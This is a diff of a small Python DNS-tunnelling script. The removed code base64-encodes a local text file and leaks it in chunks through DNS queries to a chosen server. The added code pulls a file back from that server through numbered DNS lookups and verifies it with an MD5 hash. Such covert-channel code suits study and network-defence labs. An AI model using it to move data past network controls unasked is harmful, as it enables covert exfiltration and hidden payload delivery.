@@ -1,26 +1,36 @@
-from dns import resolver
+import dnslib
 import base64
+import socket
 import sys
+import hashlib
+
+def send_dns_query(data, server_ip, server_port=53):
+    dns_request = dnslib.DNSRecord.question(data)
+
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.settimeout(5) 
+        sock.sendto(dns_request.pack(), (server_ip, server_port))
+  
+        try:
+            data, _ = sock.recvfrom(1024)
+            dns_response = dnslib.DNSRecord.parse(data)
+
+            received_data = str(dns_response.rr[0].rname)
+            splitted_received_data = received_data[:-5]
+       
+            return splitted_received_data
+           
+        except socket.timeout:
+            print("Die DNS-Anfrage hat ein Timeout erreicht.")
+            return None
 
 
-def send_dns_query(domain, dns_server):
-    try:
-        r = resolver.Resolver()
-        r.nameservers = [dns_server]
-        r.resolve(domain, 'A', lifetime=1)
-    except:
-        pass
+def decode_response(response):
+    str_reponse = ""
+    for r in response:
+        str_reponse += r
 
-def readTextFile():
-    file_path = './text.txt'
-    with open(file_path, 'r') as file:
-        file_content = file.read()
-    return file_content
-
-def encodeBase64(content):
-    content_bytes = content.encode('utf8')
-    b64_content_bytes = base64.b64encode(content_bytes)
-    return b64_content_bytes
+    return base64.b64decode(str_reponse).decode()
 
 def split_bytes(data, chunk_size):
     splitted_data = []
@@ -29,19 +39,38 @@ def split_bytes(data, chunk_size):
 
     return splitted_data
 
+def gen_hash(payload): 
+    md5_hash = hashlib.md5()
+    md5_hash.update(payload.encode())
+    result = md5_hash.hexdigest()
+    return result
+
 
 if __name__ == '__main__':
     server_addr = sys.argv[1]
+    filename = sys.argv[2]
 
-    print(f"Sending data to {server_addr}")
+    fragment_count = send_dns_query(f"{filename}.com", server_addr)
+    fragment_count = int(fragment_count)
+    
+    response = []
+    for i in range(fragment_count):
+        curr_response = send_dns_query(f"{i}.{filename}.com", server_addr)
+        response.append(curr_response.split("'")[1])
 
-    file_content = readTextFile()
-    b64Content = encodeBase64(file_content)
+    decoded_string = decode_response(response)
 
-    splitted_bytes = split_bytes(b64Content, 63)
+    received_md5 = send_dns_query(f"{fragment_count+1}.{filename}.com", server_addr)
+    hsh = gen_hash(decoded_string)
+    
+    if hsh == received_md5:
+        print(decoded_string)
+    else:
+        print("Error in extracting Data")
 
-    for data in splitted_bytes:
-        decoded_string = data.decode('utf-8')
-        send_dns_query(decoded_string, server_addr)
+
+
+    
+
 
     
